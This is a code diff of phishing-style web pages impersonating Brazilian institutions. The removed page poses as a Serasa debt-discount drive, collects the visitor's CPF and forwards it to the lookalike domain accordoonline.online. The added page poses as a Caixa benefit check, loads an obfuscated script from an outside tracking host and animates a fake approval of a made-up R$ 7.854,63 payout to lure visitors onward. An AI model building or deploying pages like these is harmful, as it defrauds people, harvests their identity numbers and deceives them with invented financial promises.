@@ -1,371 +1,345 @@
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Serasa - Feirão Limpa Nome 2026</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <style>
-        :root {
-            --color-primary: #e91e63;
-            --color-secondary: #e91e63;
-            --color-tertiary: #ffffff;
-            --color-background: #f5f5f5;
-            --color-text: #3a4859;
-            --color-error: #ff0000;
-            --color-success: #00a651;
-            --font-primary: "Montserrat", "Futura Bold", sans-serif;
-            --font-secondary: "Montserrat", "Futura Book", sans-serif;
-            --border-radius: 8px;
-            --box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.15);
-            --transition: all 0.3s ease;
-        }
+<!DOCTYPE html><html lang="pt-BR"><head>
+<script 
+        src="https://cdn.xtracky.com/scripts/experimental.obfuscated.js"
+        data-token="ba374c9e-0020-4dce-b1fd-cac80baab7d0"
+        data-click-id-param="click_id">
+</script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Caixa - Consulta de Benefício</title>
+  <!-- Font Awesome para os ícones -->
+  <link rel="stylesheet" href="css/all.min.css">
+  <!-- Fonte Montserrat -->
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    /* RESET BÁSICO */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
 
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
+    @font-face {
+      font-family: 'FuturaBold';
+      src: url('fonts/futuraBold.eot');
+      src: url('fonts/futuraBold.eot#iefix') format('embedded-opentype'),
+           url('fonts/futuraBold.woff') format('woff'),
+           url('fonts/futuraBold.ttf') format('truetype'),
+           url('fonts/futuraBold.svg#futuraBold') format('svg');
+      font-weight: bold;
+      font-style: normal;
+    }
 
-        body {
-            font-family: var(--font-secondary);
-            background: linear-gradient(135deg, #e91e63, #f48fb1 100%);
-            color: var(--color-text);
-            line-height: 1.6;
-        }
+    body {
+      background-color: #f8f8f8;
+      display: flex;
+      justify-content: center;
+      margin: 0;
+      font-family: 'Montserrat', sans-serif;
+    }
 
-        #template {
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
+    div#content {
+      width: 100%;
+      max-width: 600px;
+      min-height: 100vh;
+      background-color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
 
-        #template-wrapper {
-            background-color: var(--color-tertiary);
-            border-radius: var(--border-radius);
-            box-shadow: var(--box-shadow);
-            width: 100%;
-            max-width: 480px;
-            overflow: hidden;
-            transition: var(--transition);
-        }
+    img.logo {
+      width: 110px;
+      margin: 10px 0;
+    }
 
-        #template-wrapper-content {
-            padding: 30px;
-        }
+    /* Barra superior no estilo da Caixa */
+    .caixa-topbar {
+      height: 5px;
+      background: linear-gradient(to right, #005CA9 70%, #F39200 30%);
+      width: 100%;
+    }
 
-        #template-header {
-            text-align: center;
-            margin-bottom: 25px;
-        }
+    /* Container geral dos passos + barras */
+    .progress-container {
+      width: 100%;
+      max-width: 600px;
+      display: flex;
+      align-items: baseline;
+      /* space-evenly ou space-around para distribuir igualmente */
+      justify-content: space-evenly; 
+      padding: 0 4px;
+      box-sizing: border-box;
+      margin: 20px 0; /* espaçamento externo opcional */
+    }
 
-        #template-logo {
-            height: 45px;
-            margin: 0 auto 15px auto;
-            display: block;
-        }
+    /* Cada passo (o círculo e o texto embaixo) */
+    .step {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
 
-        .title {
-            color: var(--color-primary);
-            font-family: var(--font-primary);
-            font-size: 1.2rem;
-            font-weight: 600;
-            margin-bottom: 10px;
-            text-align: center;
-        }
+    .progress-item {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
 
-        .description {
-            color: var(--color-text);
-            font-size: 1rem;
-            text-align: center;
-            margin-bottom: 25px;
-        }
+    /* Cada barra */
+    .progress-bar {
+      width: 40px;     /* Ajuste conforme seu layout */
+      height: 4px;     /* Espessura da barra */
+      border-radius: 4px;
+      background: #B6B6B6;
+      margin: 0 8px;   /* Espaço horizontal para separar de outros itens */
+    }
 
-        .float-label-group {
-            margin-bottom: 25px;
-        }
+    /* Círculo com check */
+    .check-container {
+      width: 40px;
+      height: 40px;
+      background-color: #B6B6B6;
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: #fff;
+      transition: background-color 0.5s ease;
+    }
 
-        .float-label {
-            position: relative;
-            margin-bottom: 20px;
-        }
+    /* Quando o step estiver "ativo", pinta o círculo de azul Caixa */
+    .step.active .check-container {
+      background-color: #005CA9;
+    }
 
-        .float-label input {
-            width: 100%;
-            padding: 15px;
-            border: 1px solid #ddd;
-            border-radius: var(--border-radius);
-            font-size: 1rem;
-            transition: var(--transition);
-            background-color: #fff;
-            color: var(--color-text);
-        }
+    .check-container i {
+      font-size: 20px;
+    }
 
-        .float-label input:focus {
-            border-color: var(--color-secondary);
-            outline: none;
-            box-shadow: 0 0 0 2px rgba(233, 30, 99, 0.2);
-        }
+    /* Título de cada passo */
+    p[id^="text"] {
+      margin: 5px 0 0 0;
+      text-align: center;
+      font-size: 12px;
+      font-weight: 600;
+    }
 
-        .float-label label {
-            position: absolute;
-            top: -10px;
-            left: 10px;
-            background-color: white;
-            padding: 0 5px;
-            font-size: 0.85rem;
-            color: var(--color-primary);
-            font-weight: 500;
-        }
+    /* Seção de mais informações ao final */
+    section#more-information {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 0 10px;
+      opacity: 0;
+      transition: opacity 2s ease-out;
+    }
 
-        .button-group {
-            margin-top: 20px;
-        }
+    section#more-information.visible {
+      opacity: 1;
+    }
 
-        button.button-primary {
-            width: 100%;
-            padding: 15px;
-            background-color: var(--color-secondary);
-            color: white;
-            border: none;
-            border-radius: var(--border-radius);
-            font-family: var(--font-primary);
-            font-weight: 600;
-            font-size: 1rem;
-            cursor: pointer;
-            transition: var(--transition);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
+    .copy-container {
+      text-align: center;
+    }
 
-        button.button-primary:hover {
-            background-color: #d81b60;
-            transform: translateY(-2px);
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-        }
+    .copy-container .user-name {
+      font-weight: 700;
+      margin-bottom: 0;
+      font-size: 1rem;
+    }
 
-        button.button-primary:active {
-            transform: translateY(0);
-        }
+    .copy-container .subtitle {
+      margin-top: 0;
+      font-size: 12px;
+    }
 
-        button.button-primary:disabled {
-            opacity: 0.7;
-            cursor: not-allowed;
-        }
+    .copy-container .amount {
+      margin: 10px 0;
+      font-size: 28px;
+      font-weight: 700;
+      color: #005CA9;
+      opacity: 0;
+      transform: translateY(-40px);
+      transition: all 1s ease-in-out;
+    }
 
-        button.button-primary i {
-            margin-right: 8px;
-        }
+    .copy-container .amount.visible {
+      opacity: 1;
+      transform: translateY(0);
+    }
 
-        #resultado {
-            margin-top: 25px;
-            padding: 20px;
-            border-radius: var(--border-radius);
-            display: none;
-            font-size: 0.95rem;
-            line-height: 1.5;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
-        }
+    .copy-container .final-text {
+      width: 14rem;
+      font-size: 12px;
+      line-height: 22px;
+      margin: 0;
+    }
 
-        #resultado.sucesso {
-            background-color: rgba(0, 166, 81, 0.1);
-            color: var(--color-success);
-            border-left: 4px solid var(--color-success);
-            display: block;
-        }
-
-        #resultado.erro {
-            background-color: rgba(255, 0, 0, 0.1);
-            color: var(--color-error);
-            border-left: 4px solid var(--color-error);
-            display: block;
-        }
-
-        .loader {
-            display: none;
-            border: 3px solid rgba(233, 30, 99, 0.1);
-            border-top: 3px solid var(--color-primary);
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 25px auto;
-        }
-
-        .loader.active {
-            display: block;
-        }
-
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-
-        #template-info {
-            text-align: center;
-            margin-top: 30px;
-            border-top: 1px solid #eee;
-            padding-top: 20px;
-        }
-
-        .faq-layout {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        #template-wrapper-help {
-            margin-right: 10px;
-        }
-
-        .faq-link {
-            font-weight: bold;
-            color: var(--color-primary);
-            text-decoration: none;
-            cursor: pointer;
-        }
-
-        .faq-link:hover {
-            text-decoration: underline;
-        }
-
-        @media (max-width: 576px) {
-            #template-wrapper-content {
-                padding: 20px;
-            }
-
-            .title {
-                font-size: 1.1rem;
-            }
-
-            .description {
-                font-size: 0.9rem;
-            }
-
-            .float-label input {
-                padding: 12px;
-            }
-
-            button.button-primary {
-                padding: 12px;
-            }
-        }
-    </style>
+    /* Header da Caixa */
+    header {
+      background-color: white;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      width: 100%;
+      display: flex;
+      justify-content: center;
+      padding: 10px 0;
+    }
+  </style>
 </head>
 <body>
-    <div id="template">
-        <div id="template-wrapper">
-            <div id="template-wrapper-content">
-                <header id="template-header">
-                    <img alt="logo serasa" id="template-logo" src="/images/image.png">
-                </header>
+  <div id="content">
+    <div class="caixa-topbar"></div>
+    <header>
+      <img src="images/logo-caixa.png" alt="Logo Caixa" class="logo">
+    </header>
 
-                <section id="template-section">
-                    <h4 class="title">
-                        <i class="fas fa-hand-holding-usd"></i> Feirão Limpa Nome 2026
-                    </h4>
-                    <p class="description">
-                        O Feirão Limpa Nome 2026 começou! Faça login com seu CPF e aproveite até 90% de desconto nas suas dívidas
-                    </p>
+    <!-- Container de Progresso -->
+    <div class="progress-container">
+      <!-- Barra ANTES do primeiro círculo -->
+      <div class="progress-bar" id="bar0"></div>
 
-                    <form id="cpf-form">
-                        <div class="float-label-group">
-                            <div class="float-label">
-                                <input
-                                    type="text"
-                                    id="cpf"
-                                    name="cpf"
-                                    placeholder=""
-                                    maxlength="14"
-                                    required
-                                />
-                                <label for="cpf">
-                                    <i class="fas fa-id-card"></i> CPF
-                                </label>
-                            </div>
-                        </div>
-
-                        <div class="button-group">
-                            <button type="submit" id="verificarBtn" class="button-primary">
-                                <i class="fas fa-search"></i> Verificar meus descontos
-                            </button>
-                        </div>
-                    </form>
-
-                    <div class="loader" id="loader"></div>
-                    <div id="resultado"></div>
-                </section>
-
-                <footer id="template-info">
-                    <section id="template-faq">
-                        <div class="faq-layout">
-                            <div id="template-wrapper-help">
-                                <i class="fas fa-question-circle" style="color: var(--color-primary); font-size: 20px;"></i>
-                            </div>
-                            <a href="#faq" class="faq-link">Preciso de ajuda</a>
-                        </div>
-                    </section>
-                </footer>
-            </div>
+      <!-- Step 1 -->
+      <div class="step" id="step1">
+        <div class="progress-item">
+          <div class="check-container"><i class="fas fa-check"></i></div>
         </div>
+        <p id="text1">Solicitando Aprovação</p>
+      </div>
+
+      <!-- Barra entre Step 1 e Step 2 -->
+      <div class="progress-bar" id="bar1"></div>
+
+      <!-- Step 2 -->
+      <div class="step" id="step2">
+        <div class="progress-item">
+          <div class="check-container"><i class="fas fa-check"></i></div>
+        </div>
+        <p id="text2">Analisando Dados</p>
+      </div>
+
+      <!-- Barra entre Step 2 e Step 3 -->
+      <div class="progress-bar" id="bar2"></div>
+
+      <!-- Step 3 -->
+      <div class="step" id="step3">
+        <div class="progress-item">
+          <div class="check-container"><i class="fas fa-check"></i></div>
+        </div>
+        <p id="text3">Benefício Aprovado</p>
+      </div>
     </div>
 
-    <script>
-        const cpfInput = document.getElementById('cpf');
-        const form = document.getElementById('cpf-form');
-        const loader = document.getElementById('loader');
-        const resultado = document.getElementById('resultado');
-        const verificarBtn = document.getElementById('verificarBtn');
+    <!-- Informações finais -->
+    <section id="more-information">
+      <div class="copy-container">
+        <p class="user-name" id="user-name">Usuário</p>
+        <p class="subtitle">Seu benefício no valor de</p>
+        <p class="amount" id="amount-value">R$ 0,00</p>
+        <p class="final-text">
+          Este valor está reservado para você. Complete os próximos
+          passos para receber seu benefício ainda hoje.
+        </p>
+      </div>
+    </section>
+  </div>
 
-        // Formatar CPF
-        function formatarCPF(value) {
-            let cpf = value.replace(/\D/g, '');
-            cpf = cpf.replace(/(\d{3})(\d)/, '$1.$2');
-            cpf = cpf.replace(/(\d{3})(\d)/, '$1.$2');
-            cpf = cpf.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
-            return cpf;
+  <script>
+    // Pega parâmetros de URL, se quiser usar ?name=Fulano
+    function getSearchParam(key) {
+      const urlParams = new URLSearchParams(window.location.search);
+      return urlParams.get(key) || '';
+    }
+
+    // Anima "preenchimento" de cada barra
+    function animateBar(barId, duration, callback) {
+      const bar = document.getElementById(barId);
+      if (!bar) return;
+      let startTime = null;
+
+      function step(timestamp) {
+        if (!startTime) startTime = timestamp;
+        const progress = timestamp - startTime;
+        const percentage = Math.min(progress / duration, 1);
+
+        bar.style.background = `linear-gradient(to right, #005CA9 ${100 * percentage}%, #B6B6B6 ${100 * percentage}%)`;
+
+        if (progress < duration) {
+          window.requestAnimationFrame(step);
+        } else {
+          // Finaliza a barra toda azul
+          bar.style.background = '#005CA9';
+          if (callback) callback();
         }
+      }
 
-        cpfInput.addEventListener('input', function(e) {
-            e.target.value = formatarCPF(e.target.value);
+      window.requestAnimationFrame(step);
+    }
+
+    // Ativa o círculo (fica azul)
+    function activateStep(stepEl) {
+      stepEl.classList.add('active');
+    }
+
+    // Mostra o valor gradualmente
+    function showAmountWithAnimation() {
+      const amountEl = document.getElementById('amount-value');
+      const finalAmount = 'R$ 7.854,63';
+      let currentText = '';
+      let index = 0;
+
+      amountEl.textContent = '';
+      amountEl.classList.add('visible');
+
+      const interval = setInterval(() => {
+        if (index < finalAmount.length) {
+          currentText += finalAmount[index];
+          amountEl.textContent = currentText;
+          index++;
+        } else {
+          clearInterval(interval);
+        }
+      }, 100);
+    }
+
+    // Mostra a seção final (com um delay)
+    function showCopy(delay) {
+      setTimeout(() => {
+        document.getElementById('more-information').classList.add('visible');
+        showAmountWithAnimation();
+      }, delay);
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      // Ajusta nome via querystring se quiser
+      const name = getSearchParam('name') || 'Visitante';
+      document.getElementById('user-name').textContent = name
+        .split(' ')
+        .map(word => word.charAt(0).toUpperCase() + word.slice(1))
+        .join(' ');
+
+      // Seletores dos steps
+      const step1 = document.getElementById('step1');
+      const step2 = document.getElementById('step2');
+      const step3 = document.getElementById('step3');
+
+      // 1) Anima barra0 e, em seguida, ativa step1
+      animateBar('bar0', 2000, () => {
+        activateStep(step1);
+
+        // 2) Anima barra1, depois ativa step2
+        animateBar('bar1', 2000, () => {
+          activateStep(step2);
+
+          // 3) Anima barra2, depois ativa step3
+          animateBar('bar2', 2000, () => {
+            activateStep(step3);
+
+            // Por fim, mostra a info final
+            showCopy(1000);
+          });
         });
-
-        form.addEventListener('submit', function(e) {
-            e.preventDefault();
-            
-            const cpfNumbers = cpfInput.value.replace(/\D/g, '');
-            
-            if (cpfNumbers.length !== 11) {
-                resultado.className = 'erro';
-                resultado.textContent = 'CPF inválido. O CPF deve conter 11 dígitos.';
-                return;
-            }
-
-            // Mostrar loader
-            loader.classList.add('active');
-            resultado.style.display = 'none';
-            verificarBtn.disabled = true;
-            verificarBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verificando...';
-
-            setTimeout(function() {
-                loader.classList.remove('active');
-                resultado.className = 'sucesso';
-                resultado.textContent = 'CPF verificado com sucesso! Redirecionando...';
-                
-                // Redirecionar após 1 segundo
-                setTimeout(function() {
-                    window.location.href = `https://accordoonline.online/aproveite/${cpfNumbers}`;
-                }, 1000);
-            }, 2000);
-        });
-    </script>
-</body>
-</html>
+      });
+    });
+  </script>
+</body></html>
